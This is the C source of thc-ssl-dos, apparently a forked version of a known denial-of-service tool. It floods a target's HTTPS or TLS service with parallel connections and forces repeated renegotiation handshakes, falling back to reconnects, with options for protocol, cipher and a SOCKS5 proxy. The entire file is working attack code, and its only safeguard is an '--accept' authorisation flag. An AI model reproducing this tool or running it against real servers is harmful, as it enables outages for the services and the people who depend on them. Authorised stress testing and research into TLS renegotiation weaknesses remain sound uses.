#include "thc-ssl-dos.h"

char **split(char *input, char *needle) {
	char **splitted = (char **) malloc(sizeof(char *) * 2);

	splitted[1] = strstr(input, needle);

	if (splitted[1] == NULL)
		return NULL;

	splitted[1] = splitted[1] + strlen(needle);

	splitted[0] = (char *) malloc(sizeof(char) * (strlen(input) - strlen(splitted[1]) - strlen(needle)));
	strncpy(splitted[0], input, strlen(input) - strlen(splitted[1]) - strlen(needle));

	return splitted;
}

static char *int_ntoa(uint32_t ip) {
	struct in_addr x;

	//memset(&x, 0, sizeof(x));
	x.s_addr = ip;
	return inet_ntoa(x);
}

static uint64_t getusec(struct timeval *tv) {
	struct timeval tv_l;

	if (tv == NULL) {
		tv = &tv_l;
		gettimeofday(tv, NULL);
	}

	return (uint64_t) tv->tv_sec * 1000000 + tv->tv_usec;
}

// Called if in state STATE_TCP_CONNECTING
static int tcp_connect_io(struct _peer *p) {
	int ret;
	socklen_t len;

	/* 
	 * Socket became writeable. Either the connection was successful
	 * (errno == 0) or we have an error and we have to reconnect.
	*/
	len = 4;
	getsockopt(p->sox, SOL_SOCKET, SO_ERROR, &errno, &len);

	//DEBUGF("ret %d errno %d %s\n", ret, errno, strerror(errno));
	ret = tcp_connect_try_finish(p, errno);

	return ret;
}

static int tcp_connect_try_finish(struct _peer *p, int ret) {
	if (ret != 0) {
		if ((errno != EINPROGRESS) && (errno != EAGAIN)) {
			if (g_opt.stat.total_tcp_connections <= 0) {
				fprintf(stderr, "TCP connect(%s:%d): %s\n", int_ntoa(g_opt.ip), ntohs(g_opt.port), strerror(errno));
				exit(-1);
			}

			return -1;
		}

		p->state = STATE_TCP_CONNECTING;
		FD_SET(p->sox, &g_opt.wfds);
		FD_CLR(p->sox, &g_opt.rfds);

		return 0;
	}
	else {
		g_opt.stat.total_tcp_connections++;
		FD_CLR(p->sox, &g_opt.wfds);
		PEER_SSL_connect(p);
	}

	return 0;
}

int tcp_connect(struct _peer *p) {
	int ret;

	if ((g_opt.prot == DTLSv1) || (g_opt.prot == DTLSv1_2))
		p->sox = socket(AF_INET, SOCK_DGRAM, IPPROTO_TCP);
	else
		p->sox = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);


	if (p->sox < 0)
		return -1;

	if (p->sox > g_opt.max_sox)
		g_opt.max_sox = p->sox;

	fcntl(p->sox, F_SETFL, fcntl(p->sox, F_GETFL, 0) | O_NONBLOCK);

	memset(&p->addr, 0, sizeof p->addr);
	p->addr.sin_family = AF_INET;
	p->addr.sin_port = g_opt.port;
	p->addr.sin_addr.s_addr = g_opt.ip;

	ret = connect(p->sox, (struct sockaddr *) &p->addr, sizeof p->addr);
	
	struct timeval tv;
	gettimeofday(&tv, NULL);
	p->tv_connect_sec = tv.tv_sec;
	
	// On some linux connect() on localhost can complete instantly even on non-blocking sockets
	ret = tcp_connect_try_finish(p, ret);

	return ret;
}

int socks5_connect(struct _peer *p) {
	int ret;
	time_t start_socks5 = time(NULL);
	char buf[16];
	memset(&buf, 0x00, 16);

	// Create TCP connection to SOCKS5 proxy server
	p->sox = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (p->sox < 0)
		return -1;

	if (p->sox > g_opt.max_sox)
		g_opt.max_sox = p->sox;

	fcntl(p->sox, F_SETFL, fcntl(p->sox, F_GETFL, 0) | O_NONBLOCK);

	memset(&p->addr, 0, sizeof p->addr);
	p->addr.sin_family = AF_INET;
	p->addr.sin_port = g_opt.proxy_port;
	p->addr.sin_addr.s_addr = g_opt.proxy_ip;

	// Connect to SOCKS5 proxy server
	ret = connect(p->sox, (struct sockaddr *) &p->addr, sizeof p->addr);
	if (ret < 0) {
		//printf("[DEBUG] negative status while connecting to SOCKS5 proxy server: error code %d\n", errno);

		// Ignore "Operation now in progress" error
		if (errno != 115)
			ERREXIT("Error while connecting to SOCKS5 proxy server (error code %d)\n", errno);
	}
	
	/*
	 * Send "Greeting from Client" (3 bytes): 
	 * - SOCKS version: 0x05 (version 5)
	 * - Methods of authentication supported: 0x01 (just one)
	 * - Authentication method: 0x00 (no authentication)
	*/
	ret = send(p->sox, "\x05\x01\x00", 3, 0);
	if (ret < 0)
		ERREXIT("Error while sending \"Greeting from Client\" to SOCKS5 proxy server\n");

	/*
	 * Receive "Server's Choice" (2 bytes): 
	 * - SOCKS version: 0x05 (version 5)
	 * - Authentication method: 0x00 (no authentication)
	*/
	ret = recv(p->sox, buf, 2, MSG_WAITALL);
	while (ret < 0) {
		if (time(NULL) >= (start_socks5 + TO_SOCKS5_CONNECT))
			ERREXIT("Error while receiving \"Server's Choice'\" from SOCKS5 proxy server: %d seconds timeout reached\n", TO_SOCKS5_CONNECT);
		ret = recv(p->sox, buf, 2, MSG_WAITALL);
	}

	if (buf[0] != 0x05)
		ERREXIT("Error: invalid \"Server's Choice\" received from SOCKS5 proxy server\n");

	/*
	 * Send "Client's Connection Request" (10 bytes): 
	 * - SOCKS version: 0x05 (version 5)
	 * - Command code: 0x01 (TCP connect) or 0x03 (UDP connect)
	 * - Reserved: 0x00 (always 0)
	 * - Address type: 0x01 (IP address)
	 * - IP address: 4 bytes (one byte for every octet)
	 * - Port number: 2 bytes (range from 0x0000 to 0xFFFF, in decimal from 0 to 65535)
	*/
	char conn_request[] = {
		0x05,
		(((g_opt.prot == DTLSv1) || (g_opt.prot == DTLSv1_2)) ? 0x03 : 0x01),
		0x00,
		0x01,
		g_opt.ip & 0xFF,
		(g_opt.ip >> 8) & 0xFF,
		(g_opt.ip >> 16) & 0xFF,
		(g_opt.ip >> 24) & 0xFF,
		g_opt.port & 0xFF,
		(g_opt.port >> 8) & 0xFF
	};

	ret = send(p->sox, conn_request, 10, 0);
	if (ret < 0)
		ERREXIT("Error while sending \"Client's Connection Request\" to SOCKS5 proxy server\n");
	
	/*
	 * Receive "Server Response" (10 bytes): 
	 * - SOCKS version: 0x05 (version 5)
	 * - Status: from 0x00 (success) to 0x08 (errors)
	 * - Reserved: 0x00 (always 0)
	 * - Address type: 0x01 (IP address)
	 * - IP address: 4 bytes (one byte for every octet)
	 * - Port number: 2 bytes (range from 0x0000 to 0xFFFF, in decimal from 0 to 65535)
	*/
	memset(&buf, 0x00, 16);
	
	ret = recv(p->sox, buf, 10, MSG_WAITALL);
	while (ret < 0) {
		if (time(NULL) >= (start_socks5 + TO_SOCKS5_CONNECT))
			ERREXIT("Error while receiving \"Server Response\" from SOCKS5 proxy server: %d seconds timeout reached\n", TO_SOCKS5_CONNECT);
		ret = recv(p->sox, buf, 10, MSG_WAITALL);
	}

	if (buf[0] != 0x05)
		ERREXIT("Error: invalid \"Server Response\" received from SOCKS5 proxy server\n");
	
	switch ((enum _socks5_status) buf[1]) {
		case SUCCEEDED:
		break;

		case GENERAL_SOCKS_SERVER_FAILURE:
			ERREXIT("SOCKS5 Error: General SOCKS server failure\n");
		break;

		case CONNECTION_NOT_ALLOWED_BY_RULESET:
			ERREXIT("SOCKS5 Error: Connection not allowed by ruleset\n");
		break;

		case NETWORK_UNREACHABLE:
			ERREXIT("SOCKS5 Error: Network unreachable\n");
		break;

		case HOST_UNREACHABLE:
			ERREXIT("SOCKS5 Error: Host unreachable\n");
		break;

		case CONNECTION_REFUSED:
			ERREXIT("SOCKS5 Error: Connection refused\n");
		break;

		case TTL_EXPIRED:
			ERREXIT("SOCKS5 Error: TTL expired\n");
		break;
		
		case COMMAND_NOT_SUPPORTED:
			ERREXIT("SOCKS5 Error: Command not supported\n");
		break;

		case ADDRESS_TYPE_NOT_SUPPORTED:
			ERREXIT("SOCKS5 Error: Address type not supported\n");
		break;

		default:
			ERREXIT("Error: invalid \"Server Response\" status received from SOCKS5 proxy server (received status 0x%x)\n", buf[1]);
	}

	// Connection to SOCKS5 proxy server completed
	//printf("Successfully connected to SOCKS5 proxy server on address %s port %d\n", int_ntoa(g_opt.proxy_ip), ntohs(g_opt.proxy_port));

	struct timeval tv;
	gettimeofday(&tv, NULL);
	p->tv_connect_sec = tv.tv_sec;

	ret = tcp_connect_try_finish(p, ret);

	return ret;
}

static int ssl_connect_io(struct _peer *p) {
	int ret;

	ret = SSL_connect(p->ssl);
	if (ret == 1) {
		g_opt.stat.total_ssl_connect++;
		if (!(g_opt.flags & FL_OUTPUT_SR_ONCE)) {
			g_opt.flags |= FL_OUTPUT_SR_ONCE;
			
			#ifdef SSL_get_secure_renegotiation_support
				ret = SSL_get_secure_renegotiation_support(p->ssl);
				printf("Secure Renegotiation support: %s\n", SSL_get_secure_renegotiation_support(p->ssl) ? "yes" : "no");
			#else
				printf("Secure Renegotiation support: UNKNOWN. [Update your OpenSSL library!]\n");
			#endif
		}

		p->flags |= FL_PEER_WANT_NEXT_STATE;
		p->state = STATE_SSL_HANDSHAKING;
		return 0;
	}

	SSL_set_rw(p, ret);
	return 0;
}

static int ssl_handshake_io(struct _peer *p) {
	int ret;

	// Empty input buffer in case peer send data to us
	char buf[1024];
	while (1) {
		ret = SSL_read(p->ssl, buf, sizeof buf);
		if (ret <= 0)
			break;
	}

	ret = SSL_do_handshake(p->ssl);
	if (ret == 1) {
		p->flags |= FL_PEER_WANT_NEXT_STATE;

		// Stunnel watchdog bug, disconnect if no data is send
		g_opt.stat.total_renegotiations++;
		p->count_renegotiations++;

		if (p->count_renegotiations % 50 == 0) {
			p->state = STATE_SSL_DUMMYWRITE;
		}
		else {
			p->state = STATE_SSL_HANDSHAKING;
		}

		return 0;
	}

	int err;
	err = SSL_get_error(p->ssl, ret);
	if ((err != SSL_ERROR_WANT_READ) && (err != SSL_ERROR_WANT_WRITE)) {
		// Client-initiated renegotiation is not supported, try with reconnect approach to attack server
		if (g_opt.stat.total_renegotiations <= 0) {
			if (g_opt.reneg_mode != 0) {
				puts("Error: client-initiated renegotiation is not enabled, changing attack mode to reconnect");
				g_opt.reneg_mode = 0;
			}

			PEER_disconnect(p);
		}
	}

	SSL_set_rw(p, ret);
	return 0;
}

static int ssl_dummywrite_io(struct _peer *p) {
	char c = 0;
	int ret;

	ret = SSL_write(p->ssl, &c, 1);
	if (ret == 1) {
		p->flags |= FL_PEER_WANT_NEXT_STATE;
		p->state = STATE_SSL_HANDSHAKING;
		return 0;
	}

	SSL_set_rw(p, ret);
	return 0;
}

// Connect the peer via TCP
static void PEER_connect(struct _peer *p) {
	int ret = (g_opt.proxy_ip == -1) ? tcp_connect(p) : socks5_connect(p);
	if (ret != 0)
		ERREXIT("tcp_connect(): %s\n", strerror(errno));
}

static void PEER_read(struct _peer *p) {
	CompleteState(p);
}

static void PEER_write(struct _peer *p) {
	CompleteState(p);
}

static void PEER_disconnect(struct _peer *p) {
	if (p->ssl != NULL) {
		/*
		 * Make sure session is not kept in cache.
		 * Calling SSL_free() without calling SSL_shutdown will
		 * also remove the session from the session cache.
		*/
		SSL_free(p->ssl);
		p->ssl = NULL;
	}

	if (p->sox >= 0) {
		FD_CLR(p->sox, &g_opt.rfds);
		FD_CLR(p->sox, &g_opt.wfds);
		close(p->sox);
		p->sox = -1;
	}

	p->state = STATE_TCP_CONNECTING;
	p->flags = FL_PEER_WANT_NEXT_STATE;
}

static void PEER_SSL_connect(struct _peer *p) {
	p->ssl = SSL_new(g_opt.ctx);
	SSL_set_fd(p->ssl, p->sox);
	p->state = STATE_SSL_CONNECTING;

	ssl_connect_io(p);
}

static void PEER_SSL_dummywrite(struct _peer *p) {
	p->state = STATE_SSL_DUMMYWRITE;
	//DEBUGF("%d DummyWrite at %d\n", PEER_GET_IDX(p), p->count_renegotiations);
	ssl_dummywrite_io(p);
}

static void PEER_SSL_renegotiate(struct _peer *p) {
	int ret;

	ret = SSL_renegotiate(p->ssl);
	if (ret != 1) {
		if (g_opt.reneg_mode != 0) {
			DEBUGF("SSL_renegotiate() failed\n");
			puts("Error: client-initiated renegotiation is not enabled, changing attack mode to reconnect");
			g_opt.reneg_mode = 0;
			g_opt.stat.error_count++;
		}
		PEER_disconnect(p);
		return;
	}

	p->state = STATE_SSL_HANDSHAKING;
	ssl_handshake_io(p);
}

static void SSL_set_rw(struct _peer *p, int ret) {
	int err;
	err = SSL_get_error(p->ssl, ret);

	switch (err) {
		case SSL_ERROR_WANT_READ:
			FD_SET(p->sox, &g_opt.rfds);
			FD_CLR(p->sox, &g_opt.wfds);
		break;

		case SSL_ERROR_WANT_WRITE:
			FD_SET(p->sox, &g_opt.wfds);
			FD_CLR(p->sox, &g_opt.rfds);
		break;

		default:
			//if (!g_opt.reneg_mode && (ERR_get_error() != 336150867))
			SSLERR("SSL");
			
			if (g_opt.stat.total_ssl_connect <= 0) {
				fprintf(stderr, "#%d: This does not look like SSL!\nExiting with error code %d\n", PEER_GET_IDX(p), err);
				exit(-1);
			}
			g_opt.stat.error_count++;
			PEER_disconnect(p);
			return;
	}
}

static void NextState(struct _peer *p) {
	p->flags &= ~FL_PEER_WANT_NEXT_STATE;

	switch (p->state) {
		case STATE_TCP_CONNECTING:
			PEER_connect(p);
		break;

		case STATE_SSL_DUMMYWRITE:
			PEER_SSL_dummywrite(p);
		break;

		case STATE_SSL_HANDSHAKING:
			if (!g_opt.reneg_mode)
				PEER_disconnect(p);
			else
				PEER_SSL_renegotiate(p);
		break;

		default:
			DEBUGF("NextState(): unknown state: %d\n", p->state);
	}
}

static void CompleteState(struct _peer *p) {
	int ret;

	switch (p->state) {
		case STATE_TCP_CONNECTING:
			ret = tcp_connect_io(p);
			if (ret != 0) {
				DEBUGF("%d tcp_connect_io(): %s\n", PEER_GET_IDX(p), strerror(errno));
				g_opt.stat.error_count++;
				PEER_disconnect(p);
			}
			else {
				// TCP connect() successfully
				if (g_opt.n_peers < g_opt.n_max_peers) {
					//DEBUGF("#%d Activating..\n", g_opt.n_peers);
					// Slowly connect more TCP connections
					if (peers[g_opt.n_peers].state != STATE_UNKNOWN)
						ERREXIT("internal error\n");
					PEER_disconnect(&peers[g_opt.n_peers]);
					g_opt.n_peers++;
				}
			}
		break;

		case STATE_SSL_CONNECTING:
			ret = ssl_connect_io(p);
			if (ret != 0)
				ERREXIT("ssl_connect_io() failed\n");
		break;

		case STATE_SSL_HANDSHAKING:
			ret = ssl_handshake_io(p);
			if (ret != 0) {
				DEBUGF("ssl_handshake_io() failed\n");
				g_opt.stat.error_count++;
				PEER_disconnect(p);
			}
		break;

		case STATE_SSL_DUMMYWRITE:
			ret = ssl_dummywrite_io(p);
			if (ret != 0) {
				DEBUGF("ssl_dummywrite_io() failed\n");
				g_opt.stat.error_count++;
				PEER_disconnect(p);
			}
		break;

		default:
			ERREXIT("Unknown state: %d\n", p->state);
	}
}

static void init_default(void) {
	g_opt.n_max_peers = DEFAULT_PEERS;
	g_opt.port = htons(443);
	g_opt.ip = -1;
	g_opt.proxy_ip = -1;
	g_opt.proxy_port = -1;
	g_opt.prot = -1;
	g_opt.reneg_mode = 1;

	g_opt.cipher = NULL;
	//g_opt.cipher = (char *) malloc(sizeof(char) * strlen(CIPHER_DEFAULT));
	//strcpy(g_opt.cipher, CIPHER_DEFAULT);

	FD_ZERO(&g_opt.rfds);
	FD_ZERO(&g_opt.wfds);
}

static void init_vars(void) {
	SSL_library_init();
	SSL_load_error_strings();
	
	g_opt.ctx = SSL_CTX_new(SSLv23_method());

	#ifdef SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION
		SSL_CTX_set_options(g_opt.ctx, SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION);
		// Always guarantee we can connect to unpatched SSL Servers
		SSL_CTX_set_options(g_opt.ctx, SSL_OP_LEGACY_SERVER_CONNECT);
		SSL_CTX_set_options(g_opt.ctx, SSL_OP_ALL);
	#endif

	/*
	 * AES256-SHA              SSLv3 Kx=RSA      Au=RSA  Enc=AES(256)
	 * RC4-MD5                 SSLv3 Kx=RSA      Au=RSA  Enc=RC4(128)
	 * RSA_decrypt() is 15x slower (used for Kx) than RSA_encrypt()
	*/

	//SSL_CTX_set_cipher_list(g_opt.ctx, "ECDHE-RSA-AES256-SHA");

	if (g_opt.cipher != NULL)
		SSL_CTX_set_cipher_list(g_opt.ctx, g_opt.cipher);

	if (g_opt.prot != -1) {
		if ((g_opt.prot == DTLSv1) || (g_opt.prot == DTLSv1_2))
			g_opt.ctx = SSL_CTX_new(DTLS_method());
		else if ((g_opt.prot != SSLv2) && (g_opt.prot != SSLv3))
			g_opt.ctx = SSL_CTX_new(TLS_method());

		if (g_opt.prot != SSLv2)
			SSL_CTX_set_options(g_opt.ctx, SSL_OP_NO_SSLv2);
		if (g_opt.prot != SSLv3)
			SSL_CTX_set_options(g_opt.ctx, SSL_OP_NO_SSLv3);
		if ((g_opt.prot != TLSv1) && (g_opt.prot != DTLSv1))
			SSL_CTX_set_options(g_opt.ctx, SSL_OP_NO_TLSv1);
		if (g_opt.prot != TLSv1_1)
			SSL_CTX_set_options(g_opt.ctx, SSL_OP_NO_TLSv1_1);
		if ((g_opt.prot != TLSv1_2) && (g_opt.prot != DTLSv1_2))
			SSL_CTX_set_options(g_opt.ctx, SSL_OP_NO_TLSv1_2);
		if (g_opt.prot != TLSv1_3)
			SSL_CTX_set_options(g_opt.ctx, SSL_OP_NO_TLSv1_3);
	}

	for (int i = 0; i < MAX_PEERS; i++) {
		peers[i].sox = -1;
	}
}

static void usage(void) {
	fprintf(stderr, ""
		"./" PROGRAM_NAME " [OPTIONS] <IP> <PORT>\n"
		"  -h,             --help                           Help\n"
		"  -r,             --reconnect                      Reconnect attack mode [default: renegotiation attack mode]\n"
		"  -l <N>,         --limit <N>                      Limit parallel connections [default: %d]\n"
		"  -p <P>,         --protocol <P>                   Choose connection protocol [SSLv2/SSLv3/TLSv1/TLSv1_1/TLSv1_2/TLSv1_3/DTLSv1/DTLSv1_2]\n"
		"  -c <C>,         --cipher <C>                     Choose cipher list string [default: all ciphers]\n"
		"  -s <IP>:<PORT>, --socks-proxy <IP>:<PORT>        Specify SOCKS5 proxy [default: no proxy]\n"
		"", DEFAULT_PEERS);
	exit(0);
}

static void do_getopt(int argc, char *argv[]) {
	int i, c;

	static int accept_flag = 0;
	char **proxy_ip_port;

	static struct option long_options[] = {
		{"accept", no_argument, &accept_flag, 1},
		{"help", no_argument, NULL, 'h'},
		{"reconnect", no_argument, NULL, 'r'},
		{"limit", required_argument, NULL, 'l'},
		{"protocol", required_argument, NULL, 'p'},
		{"cipher", required_argument, NULL, 'c'},
		{"socks-proxy", required_argument, NULL, 's'},
		{0, 0, 0, 0}
	};

	int option_index = 0;
	
	while ((c = getopt_long(argc, argv, "hl:p:c:s:r", long_options, &option_index)) != -1) {
		switch (c) {
			case 0:
			break;

			case 'r':
				g_opt.reneg_mode = 0;
			break;

			case 'l':
				g_opt.n_max_peers = atoi(optarg);
			break;

			case 'p':
				if (!strcmp(optarg, "sslv2") || !strcmp(optarg, "SSLv2"))
					g_opt.prot = SSLv2;
				else if (!strcmp(optarg, "sslv3") || !strcmp(optarg, "SSLv3"))
					g_opt.prot = SSLv3;
				else if (!strcmp(optarg, "tlsv1") || !strcmp(optarg, "TLSv1"))
					g_opt.prot = TLSv1;
				else if (!strcmp(optarg, "tlsv1_1") || !strcmp(optarg, "TLSv1_1"))
					g_opt.prot = TLSv1_1;
				else if (!strcmp(optarg, "tlsv1_2") || !strcmp(optarg, "TLSv1_2"))
					g_opt.prot = TLSv1_2;
				else if (!strcmp(optarg, "tlsv1_3") || !strcmp(optarg, "TLSv1_3"))
					g_opt.prot = TLSv1_3;
				else if (!strcmp(optarg, "dtlsv1") || !strcmp(optarg, "DTLSv1"))
					g_opt.prot = DTLSv1;
				else if (!strcmp(optarg, "dtlsv1_2") || !strcmp(optarg, "DTLSv1_2"))
					g_opt.prot = DTLSv1_2;
				else
					ERREXIT("ERROR: Invalid protocol\n");
			break;

			case 'c':
				//free(g_opt.cipher);
				g_opt.cipher = (char *) malloc(sizeof(char) * strlen(optarg));
				strcpy(g_opt.cipher, optarg);
			break;

			case 's':
				proxy_ip_port = split(optarg, ":");
				if (proxy_ip_port == NULL)
					ERREXIT("ERROR: Invalid proxy format\n");

				g_opt.proxy_ip = inet_addr(proxy_ip_port[0]);
				g_opt.proxy_port = htons(atoi(proxy_ip_port[1]));

				if (g_opt.proxy_ip == -1)
					ERREXIT("ERROR: Invalid proxy IP\n");

				if (g_opt.proxy_port == -1)
					ERREXIT("ERROR: Invalid proxy port\n");
			break;

			case 'h':
			default:
				usage();
		}
	}

	if (optind >= argc) {
		usage();
	}

	if (!accept_flag) {
		fprintf(stderr, ""
			"ERROR:\n"
			"Please agree by using '--accept' option that the IP is a legitimate target\n"
			"and that you are fully authorized to perform the test against this target.\n"
		);
		exit(-1);
	}

	i = optind;
	if (i < argc) {
		g_opt.ip = inet_addr(argv[i]);
		i++;
	}

	if (i < argc) {
		g_opt.port = htons(atoi(argv[i]));
		i++;
	}

	if (g_opt.ip == -1)
		ERREXIT("ERROR: Invalid target IP address\n");
}

static void statistics_update(struct timeval *tv) {
	int32_t reneg_delta, tcp_delta, ssl_delta;
	uint32_t usec_delta;
	uint64_t usec_now;
	int32_t conn = 0;
	int i;

	reneg_delta = g_opt.stat.total_renegotiations - g_opt.stat.epoch_start_renegotiations;
	tcp_delta = g_opt.stat.total_tcp_connections - g_opt.stat.epoch_start_tcp;
	ssl_delta = g_opt.stat.total_ssl_connect - g_opt.stat.epoch_start_ssl;

	usec_now = getusec(tv);
	usec_delta = usec_now - g_opt.stat.epoch_start_usec;

	for (i = 0; i < g_opt.n_peers; i++) {
		if (peers[i].sox < 0)
			continue;

		if (peers[i].state > STATE_TCP_CONNECTING)
			conn++;
	}

	if (!g_opt.reneg_mode)
		printf("TCP connections: %" PRId32 " [%.2f c/s], SSL Connections: %" PRId32 " [%.2f c/s], %" PRId32 " Conn, %" PRIu32 " Err\n", g_opt.stat.total_tcp_connections, (float)(1000000 * tcp_delta) / usec_delta, g_opt.stat.total_ssl_connect, (float)(1000000 * ssl_delta) / usec_delta, conn, g_opt.stat.error_count);
	else
		printf("Handshakes %" PRIu32" [%.2f h/s], %" PRId32 " Conn, %" PRIu32 " Err\n", g_opt.stat.total_renegotiations, (float)(1000000 * reneg_delta) / usec_delta, conn, g_opt.stat.error_count);

	g_opt.stat.epoch_start_renegotiations = g_opt.stat.total_renegotiations;
	g_opt.stat.epoch_start_tcp = g_opt.stat.total_tcp_connections;
	g_opt.stat.epoch_start_ssl = g_opt.stat.total_ssl_connect;
	g_opt.stat.epoch_start_usec = usec_now;
}

int main(int argc, char *argv[]) {
	int i, n;
	fd_set rfds;
	fd_set wfds;

	printf(""
		"     ______________ ___  _________\n"
		"     \\__    ___/   |   \\ \\_   ___ \\\n"
		"       |    | /    ~    \\/    \\  \\/\n"
		"       |    | \\    Y    /\\     \\____\n"
		"       |____|  \\___|_  /  \\______  /\n"
		"                     \\/          \\/\n"
		"            http://www.thc.org\n"
		"\n"
		"          Twitter @hackerschoice\n"
		"\n"
		"Greetingz: the french underground\n"
		"Forked by: cyberaz0r\n\n"
	);
	fflush(stdout);

	init_default();
	do_getopt(argc, argv);
	init_vars();

	printf("Target: %s:%d\n", int_ntoa(g_opt.ip), ntohs(g_opt.port));
	printf("Attack mode: %s attack\n", g_opt.reneg_mode ? "renegotiation" : "reconnect");
	
	if (g_opt.proxy_ip != -1)
		printf("Using SOCKS5 proxy on %s:%d\n", int_ntoa(g_opt.proxy_ip), ntohs(g_opt.proxy_port));

	g_opt.n_peers = 1;
	for (i = 0; i < g_opt.n_peers; i++) {
		PEER_disconnect(&peers[i]);
	}

	struct timeval tv;
	while (1) {
		for (i = 0; i < g_opt.n_peers; i++) {
			if (peers[i].flags & FL_PEER_WANT_NEXT_STATE)
				NextState(&peers[i]);
		}

		tv.tv_sec = 0;
		tv.tv_usec = 100 * 1000;
		
		memcpy(&rfds, &g_opt.rfds, sizeof rfds);
		memcpy(&wfds, &g_opt.wfds, sizeof wfds);

		n = select(g_opt.max_sox + 1, &rfds, &wfds, NULL, &tv);
		gettimeofday(&tv, NULL);
		
		if (tv.tv_sec != g_opt.stat.epoch_start_usec / 1000000) {
			if (g_opt.stat.total_tcp_connections > 0)
				statistics_update(&tv);
		}

		if (n < 0)
			ERREXIT("select(): %s\n", strerror(errno));

		// g_opt.n_peers is dynamicly modified in this loop
		int end = g_opt.n_peers;
		for (i = 0; i < end; i++) {
			if ((peers[i].state == STATE_TCP_CONNECTING) && (peers[i].tv_connect_sec + TO_TCP_CONNECT < tv.tv_sec)) {
				fprintf(stderr, "#%d Connection timed out\n", i);
				PEER_disconnect(&peers[i]);
				continue;
			}

			if (peers[i].sox < 0)
				continue;

			if (FD_ISSET(peers[i].sox, &rfds)) {
				PEER_read(&peers[i]);
				continue;
			}

			if (FD_ISSET(peers[i].sox, &wfds)) {
				PEER_write(&peers[i]);
				continue;
			}
		}
	}

	return 0;
}